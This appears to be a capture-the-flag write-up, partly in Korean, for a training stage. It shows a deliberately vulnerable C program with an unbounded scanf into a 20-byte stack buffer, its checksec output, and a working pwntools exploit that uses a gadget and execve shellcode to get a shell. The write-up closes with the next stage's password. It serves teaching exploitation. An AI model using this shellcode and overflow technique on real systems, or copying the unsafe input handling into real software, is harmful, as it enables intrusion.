https://github.com/hspace-io/Space_Alone/blob/main/problems/Chapter03/ch3.c
```
//Stage3 of BOF expedition
//Compile : gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack -no-pie -o stage3 stage3.c

#include<stdio.h>
#include<stdlib.h>

int check_value = 0;

void shell()
{
    check_value = 1;
    printf("You Open the Armory Door!\n\n");
    system("/bin/sh");
}

void Power_Supply()
{
    printf("Armory lights up!\n\n");
}

void Power_cut_off()
{
    printf("The lights go out in the armory!\n\n");
}

void Weapon_Select()
{
    int weapon_choice;

    if(check_value != 1)
    {
        printf("You must be open the door!\n\n");
    }
    else
    {
        printf("Weapon List\n");
        printf("[1] Knife\n");
        printf("[2] Gun\n");
        printf("[3] Frying Pan\n");
        printf("[4] Baseball Bet\n");

        printf("Select a Weapon : ");
        scanf("%d", &weapon_choice);
        
        switch (weapon_choice) {
        case 1:
            printf("[Knife] I got it!\n\n");
            break;
        case 2:
            printf("[Gun] I got it!\n\n");
            break;
        case 3:
            printf("[Frying Pan] I got it!\n\n");
            break;
        case 4:
            printf("[Baseball] I got it!\n\n");
            break;
        default:
            printf("Wrong input!\n");
            break;
        }
    }
}

void Open_Door()
{
    char password[20];
    
    printf("Enter Password : ");
    scanf("%s", password);
}

void Close_Door()
{
    if(check_value ==  0)
    {
        printf("The door is already closed\n\n");
    }
}

void Check_Security_System_Log()
{
    printf("Arch:     i386-32-little\n");
    printf("RELRO:    Partial RELRO\n");
    printf("Stack:    No canary found\n");
    printf("NX:       NX unknown - GNU_STACK missing\n");
    printf("PIE:      No PIE\n");
    printf("Stack:    Executable\n");
    printf("RWX:      Has RWX segments\n\n");
}

void print_menu()
{
    printf("Armory Management System\n");
    printf("<Menu>\n");
    printf("[0] Turn Off Armory Management System\n");
    printf("[1] Power Supply\n");
    printf("[2] Power cut-off\n");
    printf("[3] Weapon Select\n");
    printf("[4] Check the security system log\n");
    printf("[5] Open Door\n");
    printf("[6] Close Door\n\n");
}

int main(void)
{
    int select_menu;

    print_menu();
    
    while(1)
    {
        printf("Select Menu : ");
        scanf("%d", &select_menu);
        
        if(select_menu == 0)
        {
            break;
        }
        else if(select_menu == 1)
        {
            Power_Supply();
        }
        else if(select_menu == 2)
        {
            Power_cut_off();
        }
        else if(select_menu == 3)
        {
            Weapon_Select();
        }
        else if(select_menu == 4)
        {
            Check_Security_System_Log();
        }
        else if(select_menu == 5)
        {
            Open_Door();
            puts(" ");
        }
        else if(select_menu == 6)
        {
            Close_Door();
        }
        else
        {
            printf("Wrong input!\n");
            break;
        }
    }
}
```

```
Breaking_Through_for_Survival@hsapce-io:~$ checksec ./stage3
[*] '/home/Breaking_Through_for_Survival/stage3'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

``main()`` 함수에서는 메뉴를 고르고 메뉴에 해당하는 함수를 실행한다.  
그 중 5번 옵션인 ``Open_Door()``를 실행하는데, 해당 함수에서는 ``scanf("%s", password);``로 입력을 받는다.  
``password`` 변수는 길이가 20으로 고정이기 때문에, Chapter 2와 사용하는 함수만 다를 뿐, 결과적으로 Stack-based Buffer Overflow가 발생한다.  

그러나 이번엔 scanf를 사용하기 때문에 공백(스페이스, 탭, 개행)이나 문자열 종료를 뜻하는 \x00을 포함하지 않는 쉘코드를 써야 한다.  
따라서 scanf 우회용으로 제작된 쉘코드를 써야 한다.  
직접 쉘코드를 짜는 방법도 있지만, 인터넷에 이미 scanf 우회용으로 제작된 쉘코드가 많이 있기 때문에 인터넷에서 쉘코드를 긁어와서 문제를 해결했다.  

이번에도 ``0x080490bb : push esp ; mov ebx, dword ptr [esp] ; ret`` 가젯이 있었기 때문에 사용가능한 접근이다.  

익스플로잇은 아래와 같다:
```
# expl.py
from pwn import *

context.arch = "i386"
p = process('./stage3')

push_esp_ret = 0x080490bb
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

p.sendlineafter(b"<Menu>", b'5')

payload = b'A' * 0x18
payload += b'B' * 0x4   # Overwrite EBP
payload += p32(push_esp_ret)
payload += shellcode

p.sendline(payload)

p.interactive()
```

위의 익스플로잇으로 쉘을 획득하였다.  
status 명령어로 Chapter 4 유저의 PW를 확인하면 된다. 

```
$ status
UID: 504
Chapter4 PW: extRAOrdinary_crawbar!
■■■■■■■■■□
$
```
